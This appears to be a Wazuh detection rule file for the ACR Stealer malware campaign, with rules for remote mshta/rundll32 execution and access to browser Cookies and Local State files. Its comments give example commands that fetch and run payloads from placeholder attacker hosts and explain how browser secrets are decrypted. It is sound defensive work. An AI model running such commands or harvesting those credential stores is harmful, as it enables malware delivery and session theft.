<!-- ============================================================
     ACR Stealer Detection Rules
     Threat: ACR Stealer - ClickFix delivery via WebDAV/MSHTA intrusion chains
     Source: Microsoft Security Blog / BleepingComputer / The Hacker News, July 2026
     MITRE ATT&CK Techniques:
       T1566     - Phishing (ClickFix lure via malvertising/SEO) (TA0001)
       T1218.005 - Signed Binary Proxy Execution: Mshta (TA0005)
       T1218.011 - Signed Binary Proxy Execution: Rundll32 (TA0005)
       T1059.001 - Command and Scripting Interpreter: PowerShell (TA0002)
       T1555.003 - Credentials from Web Browsers (TA0006)
       T1528     - Steal Application Access Token (TA0006)
       T1071.001 - Application Layer Protocol: Web Protocols (TA0011)
     Rule IDs: 104020-104025
     Author: SecOps Engineer (Purple Team)
     Date: 2026-07-19

     Threat Summary:

     ACR Stealer (previously marketed as Amatera Stealer) is an
     information-stealing malware offered via a malware-as-a-service
     (MaaS) model. Microsoft observed a surge in ACR Stealer attacks
     targeting enterprise customers in July 2026. Two distinct
     intrusion chains were documented, both using ClickFix social
     engineering as the entry point (malvertising or SEO-poisoned
     search results presenting a fake CAPTCHA/verification page that
     instructs the victim to paste a command into Win+R / cmd.exe).

     ACR Stealer primary exfiltration targets:
       - Browser-stored passwords (Chrome/Edge/Firefox Login Data SQLite)
       - Browser session cookies (Cookies SQLite database - for T1528)
       - Chrome/Edge Local State file (contains DPAPI-encrypted AES key
         used to decrypt all stored browser secrets - key extraction step)
       - Microsoft 365 files matching Office/PDF extensions on Desktop
         and in Documents, Downloads, and AppData paths
       - Cryptocurrency wallet files (MetaMask, Exodus, Ledger Live)

     Intrusion Chain 1: WebDAV DLL Delivery
       1. ClickFix prompt triggers cmd.exe to run an attacker-supplied command
       2. cmd.exe invokes rundll32.exe to load a DLL from a remote WebDAV
          share accessed over HTTPS
       3. WebDAV paths use GUID-based directory structures and legitimate-
          looking filenames (e.g., /a1b2c3d4-e5f6.../google.ct) to blend
          with expected network traffic and evade proxy inspection
       4. Loaded DLL drops Python-based loader and establishes persistence
       5. C2 resolution uses blockchain dead-drop (similar to EtherHiding:
          attacker posts C2 IP into an Ethereum smart contract transaction)
       6. Browser credential and file exfiltration over HTTPS

     Intrusion Chain 2: MSHTA Fileless Chain
       1. ClickFix prompt triggers mshta.exe to fetch a remote HTA file
          via HTTPS from an attacker-controlled domain
       2. Embedded VBScript in the HTA abuses COM objects (Shell.Application,
          WScript.Shell) to decode and invoke obfuscated PowerShell
       3. PowerShell uses steganography: fetches a publicly hosted image
          (PNG/JPG) and extracts encoded shellcode from pixel least-significant
          bits; shellcode or .NET assembly is injected and executed in-memory
       4. No payloads touch disk (fileless execution)
       5. In-memory stealer accesses browser Cookies and Local State for
          session token harvest and DPAPI key extraction

     Log source prerequisites:
       - Sysmon EventID 1 (ProcessCreate) - Wazuh SID 61603
         Required for rules 104020, 104021, 104022, 104023, 104024.
         Sysmon must capture CommandLine and ParentImage fields.
       - Sysmon EventID 11 (FileCreate) - Wazuh SID 61644
         Supplementary for detecting file-copy staging of credential DBs.

     Severity tiers:
       12 - mshta.exe spawning child interpreter (high-noise, triage signal)
       13 - mshta.exe executing remote HTA over HTTPS (near-certain malicious)
       13 - rundll32.exe loading DLL from WebDAV/HTTPS path (near-certain)
       13 - non-browser process referencing browser Cookies/Local State path
       14 - browser credential sweep: 3+ access events in 60s (confirmed sweep)

     References:
       Microsoft Security Blog 2026-07-16:
         https://www.microsoft.com/en-us/security/blog/2026/07/16/acr-stealer-two-observed-intrusion-chains-amid-increased-threat-activity/
       BleepingComputer 2026-07:
         https://www.bleepingcomputer.com/news/security/microsoft-warns-of-surge-in-acr-stealer-attacks-on-customers/
       The Hacker News 2026-07:
         https://thehackernews.com/2026/07/acr-stealer-uses-clickfix-lures-to.html
     ============================================================ -->

<group name="initial_access,defense_evasion,credential_access,acr_stealer,clickfix,windows,">

  <!-- ===========================================================
       Rule 104020: mshta.exe executing remote HTA over HTTPS
       Sysmon Event 1 (ProcessCreate) - Wazuh SID 61603
       MITRE: T1218.005 (Signed Binary Proxy Execution: Mshta)

       ACR Stealer Campaign 2 (MSHTA Fileless Chain) begins when the
       ClickFix prompt causes the victim to run a command that spawns
       mshta.exe with a remote HTTPS URL as its argument. The HTA file
       is fetched by mshta.exe directly from the attacker's server:

         mshta.exe https://attacker-domain.com/payload.hta

       mshta.exe is a legitimate Windows utility for executing HTML
       Application files (.hta). In enterprise environments, mshta.exe
       should never fetch content from arbitrary external HTTP/HTTPS
       URLs at runtime; legitimate HTA usage references local or UNC
       paths managed by IT. Any mshta.exe invocation with an HTTP or
       HTTPS URL argument is a near-certain indicator of abuse.

       The UNC path variant (\\server\share\payload.hta) is also used
       when the WebDAV mount is pre-staged; this pattern is equally
       anomalous in enterprise contexts and is caught by the same rule.

       False positives: extremely rare. Some legacy enterprise deployment
       scripts may reference internal-only http:// paths for HTA delivery
       over trusted intranet. Tune by checking the target URL hostname
       against your known-good intranet domains before escalating.
       =========================================================== -->
  <rule id="104020" level="13">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.image" type="pcre2">(?i)\\mshta\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)(https?://|\\\\[^\\]+\\[^\\]+\\.*\.hta)</field>
    <description>ACR Stealer/ClickFix: mshta.exe fetching remote HTA content [$(win.eventdata.commandLine)] on $(win.eventdata.computer) by $(win.eventdata.user) - ACR Stealer Campaign 2 uses mshta.exe to fetch attacker-controlled HTA over HTTPS as the initial fileless payload stage; mshta.exe loading remote HTTP/HTTPS URLs is a near-certain indicator of ClickFix/HTA abuse (T1218.005)</description>
    <mitre>
      <id>T1218.005</id>
      <id>T1566</id>
    </mitre>
    <group>acr_stealer,clickfix,mshta_remote,defense_evasion,</group>
  </rule>

  <!-- ===========================================================
       Rule 104021: rundll32.exe loading DLL from WebDAV/HTTPS path
       Sysmon Event 1 (ProcessCreate) - Wazuh SID 61603
       MITRE: T1218.011 (Signed Binary Proxy Execution: Rundll32)

       ACR Stealer Campaign 1 (WebDAV DLL Delivery) uses rundll32.exe
       to load a DLL directly from a remote WebDAV share over HTTPS.
       The ClickFix command causes cmd.exe to invoke:

         rundll32.exe https://webdav.attacker.com/a1b2c3d4-e5f6.../google.ct,DllMain

       Key evasion features:
         - GUID-based paths mimic legitimate cloud storage or telemetry URLs
         - Filenames (google.ct, telemetry.dll) mimic trusted software artifacts
         - WebDAV over HTTPS means the DLL is fetched as a remote file system
           object rather than a straight HTTP download, bypassing some proxies
         - rundll32.exe is a trusted Windows binary; DLL is never written to disk

       rundll32.exe loading a DLL from an HTTP/HTTPS URL argument is
       anomalous in all enterprise contexts. Legitimate uses of rundll32.exe
       reference local or UNC paths on trusted internal shares, never arbitrary
       internet-accessible HTTPS URIs or paths containing GUIDs.

       Also catches the variant where WebDAV is mounted first and then
       accessed via a \\server\share UNC path containing an HTTP-style
       hostname (distinguishable from LAN file servers by the FQDN).

       False positives: legacy applications that invoke rundll32 with
       internal intranet UNC paths. Focus on external/internet-routable
       hostnames in the WebDAV path to reduce noise.
       =========================================================== -->
  <rule id="104021" level="13">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.image" type="pcre2">(?i)\\rundll32\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)(https?://.*\.dll|https?://.*,[A-Za-z]+|\\\\[^\\]+\.[a-z]{2,}\\.+,\s*[A-Za-z]+)</field>
    <description>ACR Stealer/ClickFix: rundll32.exe loading DLL from remote WebDAV/HTTPS path [$(win.eventdata.commandLine)] on $(win.eventdata.computer) by $(win.eventdata.user) - ACR Stealer Campaign 1 uses rundll32.exe to load a DLL directly from an attacker-controlled WebDAV share over HTTPS, bypassing disk-based AV; rundll32 with HTTPS URL arguments is a confirmed signed-binary proxy execution indicator (T1218.011)</description>
    <mitre>
      <id>T1218.011</id>
      <id>T1566</id>
    </mitre>
    <group>acr_stealer,clickfix,rundll32_webdav,defense_evasion,</group>
  </rule>

  <!-- ===========================================================
       Rule 104022: mshta.exe spawning child interpreter
       Sysmon Event 1 (ProcessCreate) - Wazuh SID 61603
       MITRE: T1218.005 / T1059.001

       In ACR Stealer Campaign 2, after mshta.exe fetches and executes
       the remote HTA, the embedded VBScript uses COM objects to spawn
       further processes. The most common pattern is:

         mshta.exe - powershell.exe (to execute encoded payload)
         mshta.exe - cmd.exe (to stage or run secondary loader)
         mshta.exe - wscript.exe / cscript.exe (additional script execution)

       Legitimate mshta.exe usage (enterprise HTA applications, Group
       Policy distribution) rarely spawns interactive interpreters as
       child processes. When it does, the parent-child relationship is
       a strong signal of HTA-based malicious execution.

       This is a triage-level rule (level 12) because some legacy
       enterprise HTA applications do invoke PowerShell for IT automation.
       Correlate with rule 104020 (mshta remote fetch) on the same host
       within the preceding 5-10 minutes to elevate confidence. If both
       104020 and 104022 fire on the same host, treat as high-confidence
       ACR Stealer Campaign 2 execution.
       =========================================================== -->
  <rule id="104022" level="12">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.parentImage" type="pcre2">(?i)\\mshta\.exe$</field>
    <field name="win.eventdata.image" type="pcre2">(?i)(\\powershell\.exe$|\\pwsh\.exe$|\\cmd\.exe$|\\wscript\.exe$|\\cscript\.exe$|\\regsvr32\.exe$|\\rundll32\.exe$)</field>
    <description>ACR Stealer/ClickFix: mshta.exe spawned child interpreter $(win.eventdata.image) [$(win.eventdata.commandLine)] on $(win.eventdata.computer) by $(win.eventdata.user) - ACR Stealer Campaign 2 HTA VBScript uses COM objects to spawn PowerShell or cmd for in-memory payload execution; correlate with rule 104020 (mshta remote fetch) on the same host for high-confidence ACR Stealer confirmation (T1218.005, T1059.001)</description>
    <mitre>
      <id>T1218.005</id>
      <id>T1059.001</id>
    </mitre>
    <group>acr_stealer,clickfix,mshta_child_process,defense_evasion,</group>
  </rule>

  <!-- ===========================================================
       Rule 104023: Non-browser process referencing browser Cookies database
       Sysmon Event 1 (ProcessCreate) - Wazuh SID 61603
       MITRE: T1528 (Steal Application Access Token) / T1555.003

       ACR Stealer's primary credential harvest target is the browser
       Cookies SQLite database, which stores session tokens, auth cookies,
       and application access tokens for cloud services, SaaS platforms,
       and Microsoft 365. Exfiltrating cookies allows the attacker to
       impersonate authenticated sessions without needing the victim's
       password (pass-the-cookie attack).

       The stealer accesses the Cookies database at paths including:
         C:\Users\*\AppData\Local\Google\Chrome\User Data\[Profile]\Cookies
         C:\Users\*\AppData\Local\Microsoft\Edge\User Data\[Profile]\Cookies
         C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.default\cookies.sqlite
         C:\Users\*\AppData\Roaming\Opera Software\Opera Stable\Cookies

       Some ACR Stealer variants stage the file by invoking sqlite3.exe,
       xcopy, or robocopy with the Cookies path as an argument, or pass
       the path to a Python/Go subprocess for SQL extraction. This rule
       catches those patterns by matching the file path in a process
       commandLine while excluding the browser processes that legitimately
       own these files.

       False positives: backup agents (Veeam, Acronis) that back up
       user profiles may reference these paths. Tune by adding known
       backup agent paths to the negate list. Password managers with
       import-from-browser features may also trigger this.
       =========================================================== -->
  <rule id="104023" level="13">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)(\\Google\\Chrome\\User Data\\[^\\]+\\Cookies|\\Microsoft\\Edge\\User Data\\[^\\]+\\Cookies|\\Mozilla\\Firefox\\Profiles\\[^\\]+\\cookies\.sqlite|\\BraveSoftware\\Brave-Browser\\User Data\\[^\\]+\\Cookies|\\Opera Software\\Opera[^\\]*\\Cookies)</field>
    <field name="win.eventdata.image" negate="yes" type="pcre2">(?i)(\\chrome\.exe$|\\msedge\.exe$|\\firefox\.exe$|\\brave\.exe$|\\opera\.exe$|\\chromium\.exe$|\\vivaldi\.exe$|\\torch\.exe$)</field>
    <description>ACR Stealer: non-browser process $(win.eventdata.image) referencing browser Cookies database path [$(win.eventdata.commandLine)] on $(win.eventdata.computer) - ACR Stealer targets browser Cookies for session token theft (T1528); non-browser processes accessing Cookie stores are a strong infostealer indicator; correlate with rules 104020-104022 for delivery chain context (T1528, T1555.003)</description>
    <mitre>
      <id>T1528</id>
      <id>T1555.003</id>
    </mitre>
    <group>acr_stealer,credential_access,browser_cookie_theft,t1528,</group>
  </rule>

  <!-- ===========================================================
       Rule 104024: Non-browser process referencing Chrome/Edge Local State
       Sysmon Event 1 (ProcessCreate) - Wazuh SID 61603
       MITRE: T1528 / T1555.003

       Chrome and Microsoft Edge encrypt all stored passwords and cookies
       using AES-256-GCM. The AES encryption key is itself encrypted with
       the Windows DPAPI and stored in the "Local State" JSON file at:

         C:\Users\*\AppData\Local\Google\Chrome\User Data\Local State
         C:\Users\*\AppData\Local\Microsoft\Edge\User Data\Local State

       To decrypt browser passwords and cookies, an infostealer MUST
       first read the Local State file to extract the "os_crypt.encrypted_key"
       field, then call CryptUnprotectData() to decrypt the AES key.
       ACR Stealer (and most modern browser infostealers) implement this
       two-step DPAPI unwrapping before accessing credential databases.

       Any non-browser, non-updater process passing the Local State path
       as a commandLine argument (e.g., to python.exe, sqlite3.exe, or
       a custom Go/Rust/C++ binary) is performing the key extraction step
       and is a strong ACR Stealer or similar browser infostealer indicator.

       False positives: browser sync/backup tools that export Local State
       for profile migration; forensic tools (NirSoft, Autopsy) on
       incident-response workstations. Do not suppress globally; audit
       each false positive source before adding to noise suppression.
       =========================================================== -->
  <rule id="104024" level="13">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)(\\Google\\Chrome\\User Data\\Local State|\\Microsoft\\Edge\\User Data\\Local State)</field>
    <field name="win.eventdata.image" negate="yes" type="pcre2">(?i)(\\chrome\.exe$|\\msedge\.exe$|\\GoogleUpdate\.exe$|\\MicrosoftEdgeUpdate\.exe$|\\MicrosoftEdge\.exe$|\\elevation_service\.exe$)</field>
    <description>ACR Stealer: non-browser process $(win.eventdata.image) accessing browser Local State file [$(win.eventdata.commandLine)] on $(win.eventdata.computer) - Chrome/Edge Local State contains the DPAPI-encrypted AES key for all stored browser secrets; non-browser access is the DPAPI key extraction step preceding full credential/cookie harvest; high-confidence ACR Stealer or browser infostealer indicator (T1528, T1555.003)</description>
    <mitre>
      <id>T1528</id>
      <id>T1555.003</id>
    </mitre>
    <group>acr_stealer,credential_access,dpapi_key_extraction,t1528,</group>
  </rule>

  <!-- ===========================================================
       Rule 104025: ACR Stealer browser credential sweep
       Frequency rule on rule 104023 - Wazuh SID composite
       MITRE: T1555.003 / T1528

       ACR Stealer targets multiple browser profiles and browser families
       in a single sweep to maximize credential yield. After obtaining
       the DPAPI key (104024), the stealer iterates over all browser
       profile directories in a rapid sequence. Three or more distinct
       Cookies database access events from the same process on the same
       host within 60 seconds indicates an active multi-browser credential
       sweep rather than an isolated false-positive access.

       The frequency threshold (3 events in 60 seconds from same source)
       distinguishes systematic infostealer enumeration from incidental
       access. A backup agent that scans user data once per backup job
       typically runs sequentially across all profiles in well under 60
       seconds, but it would appear in the same-source window; tune by
       suppressing known backup process paths in a noise suppression rule.

       This correlation rule fires when 3 or more instances of rule 104023
       (browser Cookies access) trigger from the same agent within 60
       seconds. Level 14 (high-confidence active sweep) requires immediate
       analyst triage. Isolate the affected host and preserve memory for
       forensic analysis.
       =========================================================== -->
  <rule id="104025" level="14" frequency="3" timeframe="60">
    <if_matched_sid>104023</if_matched_sid>
    <same_field>win.eventdata.computer</same_field>
    <description>ACR Stealer: BROWSER CREDENTIAL SWEEP detected on $(win.eventdata.computer) - 3+ browser Cookies database access events in 60s by $(win.eventdata.image); active multi-browser session token and credential harvest in progress; isolate host immediately and begin forensic triage (T1555.003, T1528)</description>
    <mitre>
      <id>T1555.003</id>
      <id>T1528</id>
    </mitre>
    <group>acr_stealer,credential_access,browser_credential_sweep,critical,</group>
  </rule>

</group>
